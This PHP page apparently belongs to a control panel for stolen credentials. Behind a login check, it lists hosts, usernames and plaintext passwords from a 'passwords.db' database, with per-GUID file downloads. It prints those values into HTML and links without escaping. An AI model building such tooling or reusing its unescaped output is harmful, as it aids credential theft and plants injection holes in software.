<?php
    session_start();
    if (!isset($_SESSION['username']))
    {
        header("Location: login.php");
        die();
    }
?>

<!DOCTYPE html>
<html>
	<head>
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" />
        <link rel="shortcut icon" type="image/png" href="img/favicon.png" />
	</head>

	<body>
        <?php $type="passwords"; include("nav_bar.php"); ?>
		<div class="header">
			<a href="index.php">
			<img src="img/header-logotype.png" class="header-logotype">
            </a>
		</div>

		<div class="col-md-9">
			<div class="row">

				<table class="table" style="margin-top: -20px;">
					<thead>
						<tr>
                            <th scope="col">GUID</th>
                            <th scope="col">Type</th>
							<th scope="col">Host</th>
							<th scope="col">Username</th>
							<th scope="col">Password</th>
						</tr>
					</thead>

                    <tbody id="main_items">
                        <?php
                            if ($db = new SQLite3('info/passwords.db'))
                            {
                                $results = $db->query('SELECT * from main');
                                while ($row = $results->fetchArray())
                                {
                                    $host = substr($row['Host'], 0, 80);
                                    $file = glob("files/*{$row['GUID']}*")[0];
                                    echo "<tr class=\"table-item\">";
                                    echo "<td>{$row['GUID']}</td>";
                                    echo "<td>{$row['Type']}</td>";
                                    echo "<td>$host</td>";
                                    echo "<td>{$row['Login']}</td>";
                                    echo "<td>{$row['Password']}</td>";
                                    if ($file) echo "<td><a href=\"download.php?file=$file\" class=\"table-button\"><i class=\"fas fa-download\"></i></a></td> ";
                                    echo "</tr>";
                                }
                                $db->close();
                            }
                        ?>
                    </tbody>
				</table>
			</div>
		</div>

		<script type="text/javascript">
			$(document).ready(function() {
				var margin = ($("#stats-block").outerWidth() - ($("#counter-1").width() + $("#counter-2").width()) - 20) / 2;
				var height = $("html").outerHeight();
				$("#counters-block").css("padding-left", margin);
				$(".menu").css("height", height);
			});
		</script>
	</body>
</html>

